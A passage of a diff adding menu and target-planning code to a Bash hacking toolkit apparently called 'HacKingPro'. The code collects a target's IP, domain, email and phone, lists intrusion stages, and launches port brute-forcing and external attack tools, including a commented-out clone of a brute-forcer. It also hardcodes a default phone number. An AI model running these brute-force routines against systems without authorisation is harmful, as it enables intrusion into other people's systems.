+      echo "        ${BBlue}└──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
+    fi
+  }
+  BruteHTTP8100
+
+  read -p "$Press_ENTER"
+
+  if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
+  	help
+  	exit
+  fi
+
+  if [ ! -z "$2" ]; then
+  	if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
+  		echo -e "[${red}!${default}] Maximum number of threads is 64!"
+  		exit
+  	else
+  		thread=$2
+  	fi
+  fi
+
+  if [[ -f $1 ]]; then
+  	while IFS= read -r line; do
+  		sleep 1
+  		report $line
+  		port_scan $line
+  		bruteforce $line $2
+  	done < "$1"
+  	exit
+  fi
+
+  # sleep 1
+  # report $1
+  # port_scan $1
+  # bruteforce $1 $2
+
+  read -p "$Press_ENTER"
+
+
+}
+
+# AttacKing
+AttacKing(){
+  if [ -z $targetIP ]; then
+    Checking_IP_Target
+  else
+  # Define /HacKingPro/Case/TargetName/AttacKing
+  cd "$XHacKingProCaseTargetName"
+  mkdir AttacKing
+  cd AttacKing
+  read -p "$Press_ENTER"
+  XHacKingProCaseTargetNameAttacKing="${XHacKingPro}Case/$targetNAME/AttacKing/"
+  # Statements
+  while true; do
+  #statements
+  clear
+  # echo "
+  #   ${DGrey}   █████████    █████     █████                       ${BYellow}█████   ████  ███
+  #   ${DGrey}  ███░░░░░███  ░░███     ░░███                       ${BYellow}░░███   ███░  ░░░
+  #   ${DGrey} ░███    ░███  ███████   ███████    ██████    ██████  ${BYellow}░███  ███    ████  ████████    ███████
+  #   ${DGrey} ░███████████ ░░░███░   ░░░███░    ░░░░░███  ███░░███ ${BYellow}░███████    ░░███ ░░███░░███  ███░░███
+  #   ${DGrey} ░███░░░░░███   ░███      ░███      ███████ ░███ ░░░  ${BYellow}░███░░███    ░███  ░███ ░███ ░███ ░███
+  #   ${DGrey} ░███    ░███   ░███ ███  ░███ ███ ███░░███ ░███  ███ ${BYellow}░███ ░░███   ░███  ░███ ░███ ░███ ░███
+  #   ${DGrey} █████   █████  ░░█████   ░░█████ ░░████████░░██████  ${BYellow}█████ ░░████ █████ ████ █████░░███████
+  #   ${DGrey}░░░░░   ░░░░░    ░░░░░     ░░░░░   ░░░░░░░░  ░░░░░░  ${BYellow}░░░░░   ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░███
+  #                                                                                       ███ ░███
+  #                                                                                      ░░██████"
+  HacKingProTargetStatus=$(echo "
+
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}] ")
+
+
+  HacKingProMenuMain=$(echo "${BRed}"
+    echo "$HacKingProTargetStatus""
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 1 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Reconnaissance ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} Intruder picks a target, researches it, and looks for vulnerabilities ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Intruder selects target, researches it, and attempts to identify vulnerabilities in the target network. ${BRed}]
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 2 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}  Weaponization ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} Intruder develops malware designed to exploit the vulnerability ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Intruder creates remote access malware weapon, such as a virus or worm, tailored to one or more vulnerabilities. ${BRed}]
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 3 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}  Delivery ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} Intruder transmits the malware via a phishing email or another medium ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Intruder transmits weapon to target (e.g., via e-mail attachments, websites or USB drives) ${BRed}]
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 4 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}  Exploitation ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} The malware begins executing on the target system ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Malware weapon's program code triggers, which takes action on target network to exploit vulnerability. ${BRed}]
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 5 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}  Installation ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} The malware installs a backdoor or other ingress accessible to the attacker ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Malware weapon installs access point (e.g., backdoor) usable by intruder. ${BRed}]
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 6 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}  Command and Control ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} The intruder gains persistent access to the victim’s systems/network ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Malware enables intruder to have hands on the keyboard persistent access to target network. ${BRed}]
+
+    ${BGreen}┌─╼ ${BRed}[${BGreen} 7 ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}  Actions on Objective ${BRed}]
+    ${BGreen}|──────────╼ ${BRed}[${BYellow} Intruder initiates end goal actions, such as data theft, data corruption, or data destruction ${BRed}]
+    ${BGreen}└──────────╼ ${BRed}[${BYellow} Intruder takes action to achieve their goals, such as data exfiltration, data destruction, or encryption for ransom. ${BRed}]
+
+    ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
+
+    ${BBlue}┌──${BBlue}[${BRed} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BBlue}|
+    ${DGrey}|──[ ~$(pwd) ]
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]${BGreen}──╼ ${BRed}[${BGreen}   ")
+
+          # ${BBlue}┌──[${BRed} 00 ${BBlue}]──╼ ${BBlue}[${BRed} Orusula ${BBlue}]${BRed}──╼ ${BBlue}[${LRed} ❌ ${BBlue}]$BGreen
+          # ${BBlue}|
+          # ${BBlue}|──[${BRed} 01 ${BBlue}]──╼ ${BBlue}[${BRed} Brute Force Ports ${BBlue}]${BRed}──╼ ${BBlue}[${LRed} ✅ ${BBlue}]$BGreen
+          # ${BBlue}|
+          # ${BBlue}└──[${BRed} 03 ${BBlue}]──╼ ${BBlue}[${BRed} Orusula ${BBlue}]${BRed}──╼ ${BBlue}[${LRed} ❌ ${BBlue}]$BGreen
+
+    read -p "$HacKingProMenuMain" cmd
+    case $cmd in
+      ls )
+      ls_lahs="$(echo "\n\t ${BRed}[🙏🏼${BRed}] ${BWhite}List Files ~ Executing: ls -lahs ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${HacKingPro}")"
+      echo "$ls_lahs"
+      sleep 2
+      ls -lahs
+      sleep 2
+      read -p "$ls_lahs" cmd
+      ;;
+      arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
+      Arsenal
+      ;;
+      p|P )
+      HacKingProPlanning
+      ;;
+      0|00|Orusula )
+      cd "$xMenu03"
+      if [ -d Orusula ]; then
+        # statements
+        cd Orusula
+        if [ -e "Orusula.py" ]; then
+          python3 Orusula.py -u https://"$targetDns"
+          read -p "$Press_ENTER"
+          cd $xMenu03
+        fi
+      else
+        echo "\n  ${BRed}[ X ] Error ~ Cant Find Orusula Folder [ X ]  "
+        # read -p "$Press_ENTER"
+      fi
+      cd $xMenu03
+
+      ;;
+      1|01 )
+      echo "
+      ${BBlue}┌──[${LYellow} Well-Known Ports Status ${BBlue}]
+      ${BBlue}|──[${BYellow} 21 ${BBlue}]──[${LYellow} FTP ${BBlue}]──[${BYellow} File Transfer Protocol ${BBlue}]${BRed} ${AfterBruteFTP}
+      ${BBlue}|──[${BYellow} 22 ${BBlue}]──[${LYellow} SSH ${BBlue}]──[${BYellow} Secure Shell ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 23 ${BBlue}]──[${LYellow} Telnet ${BBlue}]──[${BYellow} Unencrypted Text Communications ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 25 ${BBlue}]──[${LYellow} SMTP ${BBlue}]──[${BYellow} Simple Mail Transfer Protocol ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 53 ${BBlue}]──[${LYellow} DNS ${BBlue}]──[${BYellow} Domain Name System ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 80 ${BBlue}]──[${LYellow} HTTP ${BBlue}]──[${BYellow} Hypertext Transfer Protocol ${BBlue}]${BRed} ${AfterBruteHTTP}
+      ${BBlue}|──[${BYellow} 110 ${BBlue}]──[${LYellow} POP3 ${BBlue}]──[${BYellow} Post Office Protocol, version 3 ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 139 ${BBlue}]──[${LYellow} SMB ${BBlue}]──[${BYellow} NetBIOS Session Service ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 162 ${BBlue}]──[${LYellow} SNMP ${BBlue}]──[${BYellow} Simple Network Management Protocol ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 389 ${BBlue}]──[${LYellow} LDAP ${BBlue}]──[${BYellow} Lightweight Directory Access Protocol ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 443 ${BBlue}]──[${LYellow} HTTPS ${BBlue}]──[${BYellow} Hypertext Transfer Protocol Secure ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 512 ${BBlue}]──[${LYellow} Rexec ${BBlue}]──[${BYellow} Remote Process Execution ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 513 ${BBlue}]──[${LYellow} Rlogin ${BBlue}]${BRed}
+      ${BBlue}└──[${BYellow} 514 ${BBlue}]──[${LYellow} rsh ${BBlue}]──[${BYellow} Remote Shell | Syslog: System Logging ${BBlue}]${BRed}
+
+      ${BBlue}┌──[${LYellow} Registered ports ${BBlue}]
+      ${BBlue}|──[${BYellow} 1433 ${BBlue}]──[${LYellow} MSSQL ${BBlue}]──[${LYellow} Microsoft SQL Server database management system ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 1521 ${BBlue}]──[${LYellow} Oracle database ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 3306 ${BBlue}]──[${LYellow} mysql ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 3389 ${BBlue}]──[${LYellow} RDP ${BBlue}]──[${LYellow} Remote Desktop Protocol | WBT: Windows Based Terminal${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 5432 ${BBlue}]──[${LYellow} PostgreSQL ${BBlue}]──[${LYellow} Database System ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 5900 ${BBlue}]──[${LYellow} VNC | RFB ${BBlue}]──[${LYellow} Virtual Network Computing | Remote Frame Buffer ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 6667 ${BBlue}]──[${LYellow} IRC ${BBlue}]──[${LYellow}	Internet Relay Chat ${BBlue}]${BRed}
+      ${BBlue}|──[${BYellow} 8000 ${BBlue}]──[${LYellow} Python3 | Djago | DynamoDB | SHOUTcast ${BBlue}]${BRed}
+      ${BBlue}└──[${BYellow} 8080 ${BBlue}]──[${LYellow} Apache Tomca ${BBlue}]${BRed}
+      "
+      BruteForce
+      # echo "\n        ${BBlue}[${BRed} t14m4t ${BBlue}]──╼ [${BRed}FTP | SSH | Telnet | SMTP | HTTP | POP3 | SMB | SNMP | LDAP | HTTPS | rexec | rlogin | rsh | IMAP | mssql | mysql | postgres | oracle | RDP | VNC | IRC ${BBlue}]"
+      # read -p "$Press_ENTER"
+      # cd "$xAttacKing"
+      # if [ -d t14m4t ]; then
+      #   #statements
+      #   cd t14m4t
+      #   if [ -e nmap.log ]; then
+      #     rm nmap.log
+      #   fi
+      #
+      #   if [ -e t14m4t ]; then
+      #     ./t14m4t $targetIP
+      #     read -p "$Press_ENTER"
+      #   fi
+      # else
+      #   if [ -e "t14m4t.zip" ]; then
+      #     #statements
+      #     sudo unzip t14m4t.zip
+      #     sudo cp -R t14m4t-master t14m4t
+      #     sudo rm -R t14m4t-master
+      #     cd t14m4t
+      #     sudo bash install.sh
+      #     sudo chmod +x t14m4t
+      #     if [ -e nmap.log ]; then
+      #       rm nmap.log
+      #     fi
+      #     ./t14m4t $targetIP
+      #     read -p "$Press_ENTER"
+      #   else
+      #     git clone https://github.com/MS-WEB-BN/t14m4t/
+      #     cd t14m4t
+      #     sudo bash install.sh
+      #     sudo chmod +x t14m4t
+      #     if [ -e nmap.log ]; then
+      #       rm nmap.log
+      #     fi
+      #     ./t14m4t $targetIP
+      #     read -p "$Press_ENTER"
+      #   fi
+      # fi
+      ;;
+      x|X|exit|EXIT )
+      cd $XHacKingPro
+      clear
+      break
+      ;;
+
+    esac
+  done
+fi
+}
+
+
+###################### HacKingPro Planning ##########################
+
+# Read Target Name From the User
+ReadTargetNameFromtheUser(){
+  # Read Target Name From the User
+  # This Variable is for Case Name.
+  t0="$(echo "\n          ${BBlue}┌──[ 🎯 ]──[${BRed} Name ${BBlue}]──╼  ")"
+  read -p "$t0" targetNAME
+  if [ -z "$targetNAME" ]; then
+    #statements
+    targetNAME="AnLoMinus"
+    # echo "\n\t  ${BRed}[${LGrey}TN${BRed}]${BBlue} - ${LGrey}Target Name ${BBlue} $targetNAME\n"
+  fi
+
+  # Checking if Case Folder Exist
+
+}
+
+# Define Variables For Case Directory
+MainDirectoriyCase="${MainDirectoriy}/Case"
+
+# Read Target Name From the User
+ReadTargetNameFromtheUser(){
+  # Read Target Name From the User
+  # This Variable is for Case Name.
+  t0="$(echo "\n          ${BBlue}┌──[ 🎯 ]──[${BRed} Name ${BBlue}]──╼  ")"
+  read -p "$t0" targetNAME
+  if [ -z "$targetNAME" ]; then
+    #statements
+    targetNAME="AnLoMinus"
+    # echo "\n\t  ${BRed}[${LGrey}TN${BRed}]${BBlue} - ${LGrey}Target Name ${BBlue} $targetNAME\n"
+  fi
+}
+
+# Read Target IP From the User
+ReadTargetIPFromtheUser(){
+# Read Target URL / Domain / Dns / Server From the User
+# This Variable is for AttacKing ~> IP Addresses .
+t1="$(echo "\n          ${BBlue}|──[ 🎯 ]──[${BRed} IP ${BBlue}]──╼  ")"
+read -p "$t1" targetIP
+if [ -z "$targetIP" ]; then
+  #statements
+  targetIP="127.0.0.1"
+  # targetIP=" "
+  echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Planning-Log.md
+fi
+}
+
+# Read Target URL From the User
+ReadTargetURLFromtheUser(){
+# Read Target URL / Domain / Dns / Server From the User
+# This Variable is for OSINT and AttacKing ~> URL / Domain / Dns / Server/ Websites .
+t2="$(echo "\n          ${BBlue}|──[ 🎯 ]──[${BRed} URL ${BBlue}]──╼  ")"
+read -p "$t2" targetDns
+if [ -z "$targetDns" ]; then
+  #statements
+  targetDns="xXx.AnLoMinus.xXx"
+  echo "> - ### Target Dns: ${targetDns}" >> ${targetNAME}-HacKingPro-Planning-Log.md
+fi
+}
+
+# Read Target Email From the User
+ReadTargetEmailFromtheUser(){
+
+# This Variable is for OSINT and AttacKing ~> Emails .
+t3="$(echo "\n          ${BBlue}|──[ 🎯 ]──[${BRed} Email ${BBlue}]──╼  ")"
+read -p "$t3" targetEmail
+if [ -z $targetEmail ]; then
+  #statements
+  targetEmail="Change.Me@Do.Now"
+  # echo "\n${BRed}[${LGrey}TE${BRed}]${BBlue} - ${LGrey}Target Email ${BBlue} $targetEmail\n"
+  echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Planning-Log.md
+fi
+}
+
+# Read Target Phone From the User
+ReadTargetPhoneFromtheUser(){
+
+# This Variable is for OSINT and AttacKing ~> Phones Numbers .
+t4="$(echo "\n          ${BBlue}└──[ 🎯 ]──[${BRed} Phone (With Country Code) ${BBlue}]──╼  ")"
+read -p "$t4" targetPhone
+if [ -z "$targetPhone" ]; then
+  #statements
+  targetPhone="9720506933037"
+  # echo "\n${BRed}[${LGrey}TP${BRed}]${BBlue} - ${LGrey}Target Phone ${BBlue} $targetPhone\n"
+fi
+echo "> - ### Target Phone: ${targetPhone}" >> ${targetNAME}-HacKingPro-Planning-Log.md
+}
+
+# Planning and Scoping
+HacKingProPlanning(){
+  clear
+  # HacKingProLogo1
+  cd "$MainDirectoriy"
+  # Menu
+  HacKingProTargetStatus=$(echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}] ")
+  echo "$HacKingProTargetStatus"
+
+  echo "\n          ${BRed}======================================================================================="
+  CheckingifCaseFolderExist
+
+  XHacKingProCaseTargetName="$XHacKingPro/Case/$targetNAME"
+
+
+  # Recommended Open With `Atom` Editor For Normal View.
+  echo "# Recommended Open With [Atom]() or [Obsidian]() Editor For Normal View." >> ${targetNAME}-HacKingPro-Planning-Log.md
+  echo "### $targetNAME Case Date: $(date)" >> ${targetNAME}-HacKingPro-Planning-Log.md
+  echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Planning-Log.md
+
+  ReadTargetIPFromtheUser
+  ReadTargetURLFromtheUser
+  ReadTargetEmailFromtheUser
+  ReadTargetPhoneFromtheUser
+
+  #
+  echo "\n          ${BRed}======================================================================================="
+  echo "\n          ${BRed}[${BYellow}🔸${BRed}]${BBlue} - ${BYellow}Listing Case \n"
+  echo "          ${BYellow} Log Directory ${BRed}[${BGreen} $(pwd) ${BRed}]\n${BGreen}"
+  echo "          ${BYellow} Log File ${BRed}[${BGreen} $(ls) ${BRed}]\n${BGreen}"
+  read -p "$Press_ENTER"
+  cd "$MainDirectoriyCase"
+  cd "$targetNAME"
+
+}
+
+# Planning Status
+FunTargetDns(){
+  #statements
+  if [ -z ${targetDns} ]; then
+    TargetDnsStatusOFF=" ❌ "
+    echo "${TargetDnsStatusOFF}"
+  else
+    targetDnsStatusON=" ✅ "
+    echo "${targetDnsStatusON}"
+  fi
+}
+FunTargetIP(){
+  #statements
+  if [ -z ${targetIP} ]; then
+    TargetIpStatusOFF=" ❌ "
+    echo "${TargetIpStatusOFF}"
+  else
+    TargetIpStatusON=" ✅ "
+    echo "${TargetIpStatusON}"
+  fi
+}
+FunTargetName(){
+  #statements
+  if [ -z ${targetNAME} ]; then
+    TargetNameStatusOFF=" ❌ "
+    echo "${TargetNameStatusOFF}"
+  else
+    TargetNameStatusON=" ✅ "
+    echo "${TargetNameStatusON}"
+  fi
+}
+FunTargetEmail(){
+  #statements
+  if [ -z ${targetEmail} ]; then
+    TargetEmailStatusOFF=" ❌ "
+    echo "${TargetEmailStatusOFF}"
+  else
+    TargetEmailStatusON=" ✅ "
+    echo "${TargetEmailStatusON}"
+  fi
+}
+FunTargetPhone(){
+      #statements
+      if [ -z ${targetPhone} ]; then
+        TargetPhoneStatusOFF=" ❌ "
+        echo "${TargetPhoneStatusOFF}"
+      else
+        TargetPhoneStatusON=" ✅ "
+        echo "${TargetPhoneStatusON}"
+      fi
+    }
+
+###################### HacKingPro Planning ##########################
+
+
+
+# Checking if Case Folder Exist
+CheckingifCaseFolderExist(){
+  ReadTargetNameFromtheUser
+  #statements
+  if [ -d Case ]; then
+    echo "\n          ${BBlue}|────${BRed}[ ✅ ${BRed}]${BBlue}──╼ ${BGreen}Case ${BYellow}Folder Exists, Continue to it\n"
+    cd Case
+    if [ -d $targetNAME ]; then
+      #statements
+      echo "          ${BBlue}|────${BRed}[ ✅ ${BRed}]${BBlue}──╼ ${BGreen}$targetNAME ${BYellow}Folder Exists, Continue to it\n"
+      cd $targetNAME
+    else
+      mkdir $targetNAME
+      cd $targetNAME
+    fi
+    if [ -d Planning ]; then
+      #statements
+      echo "          ${BBlue}|────${BRed}[ ✅ ${BRed}]${BBlue}──╼ ${BGreen}$targetNAME/Planning ${BYellow}Folder Exists, Continue to it\n"
+      cd Planning
+    else
+      mkdir Planning
+      cd Planning
+    fi
+  else
+    echo "\n          ${BBlue}|────${BRed}[ ❌ ${BRed}]${BBlue}──╼ ${BGreen}Case ${BYellow}Folder Not Exists, Create it\n"
+    echo "          ${BBlue}|────${BRed}[ ✅ ${BRed}]${BBlue}──╼ ${BYellow}Creating ${BGreen}Case ${BYellow}Folder and Continue to it\n"
+    mkdir Case
+    cd Case
+    echo "          ${BBlue}|────${BRed}[ ✅ ${BRed}]${BBlue}──╼ ${BYellow}Creating ${BGreen}$targetNAME ${BYellow}and Continue to it\n"
+    mkdir $targetNAME
+    cd $targetNAME
+    echo "          ${BBlue}|────${BRed}[ ✅ ${BRed}]${BBlue}──╼ ${BYellow}Creating ${BGreen}Case Planning ${BYellow}and Continue to it\n"
+    mkdir Planning
+    cd Planning
+  fi
+
+  # This Variable for Naming File Report
+  Planning_File="${targetNAME}-HacKingPro-Planning-Log.md"
+  if [ -e ${Planning_File} ]; then
+    t5="$(echo "          ${BBlue}|────${BRed}[ ❌ ${BRed}]${BBlue}──╼${BGreen} $Planning_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
+    read -p "$t5 " filexist
+    case $filexist in
+      y|Y)
+      cd "$XHacKingProCaseTargetName/Planning"
+      echo "          ${BBlue}|────${BRed}[ 🔶 ${BRed}]${BBlue}──╼${BGreen}  Removing {${Planning_File}} file .."
+      read -p "$Press_ENTER"
+      rm ${Planning_File}
+      echo "          ${BBlue}|────${BRed}[ ❌ ${BRed}]${BBlue}──╼${BGreen} ✅ Removed {${Planning_File}} file .."
+      cd "$XHacKingProCaseTargetName"
+      ;;
+      n|N)
+      echo "          ${BBlue}|────${BRed}[ 🔶 ${BRed}]${BBlue}──╼${BGreen} Leaving {${Planning_File}} file .."
+      ;;
+    esac
+  fi
+
+}
+
+# Checking For System Package Manager
+Check_System() {
+  # checking for system package manager
+  if [ -e /data/data/com.termux/files/usr/bin/pkg ]; then
+  pac="pkg"
+  system="termux"
+elif [ $(command -v brew) ]; then
+    pac="brew"
+    system="mac"
+    sudo=""
+  elif [ $(command -v apt) ]; then
+    pac="apt"
+    system="linux"
+  elif [ $(command -v apt-get) ]; then
+    pac="apt-get"
+    system="linux"
+  elif [ $(command -v apk) ]; then
+    pac="apk"
+    system="linux"
+  elif [ $(command -v yum) ]; then
+    pac="yum"
+    system="fedora"
+  fi
+
+  # checking for system root access
+  if [ $(command -v sudo) ]; then
+    sudo="sudo"
+  else
+    sudo=""
+  fi
+
+  # checking for system home dir
+  if [ -d $HOME ]; then
+    home=$HOME
+  else
+    home="~/"
+  fi
+
+  # checking for system bin dir
+  if [ -d /data/data/com.termux/files/usr/bin ]; then
+    bin="/data/data/com.termux/files/usr/bin"
+  elif [ -d /usr/local/bin ]; then
+    bin="/usr/local/bin"
+  elif [ -d /bin ]; then
+    bin="/bin"
+  elif [ -d /sbin ]; then
+    bin="/sbin"
+  fi
+
+}
+Check_System
+
+# Checking If User is Root
+CheckingIfRoot(){
+  ROOT_UID=0
+  if [ "$UID" -eq "$ROOT_UID" ]; then
+    echo "Yes, you are root."
+  else
+    echo "No, you are not root"
+  fi
+}
+
+# Checking Cheatsheets
+Checking_IP_Target(){
+  if [ -z $targetIP ]; then
+    #statements
+    clear
+    # HacKingProLogo1
+    echo "
+    ${ToolHeader}
+
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
+    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
+    ${DGrey}|
+    ${DGrey}└──${BRed}[${DGrey} I ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Install HacKingPro On the System ${BRed}] "
+
+    echo "\n    ${BGreen}[${BRed} ERROR ${BGreen}]${BRed}──╼ ${BGreen}[ ❌ ]${BRed}──╼  ${BGreen}[${BRed} You need Enter IP Before Scanning ${BGreen}] \n"
+    sleep 1
+    echo "    ${BGreen}┌──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
+    echo "    ${BGreen}|──${BRed}[ P ]${BGreen}──╼ ${BRed}[ ⚡️ Planning and Scoping 🎯 ]"
+    sleep 1
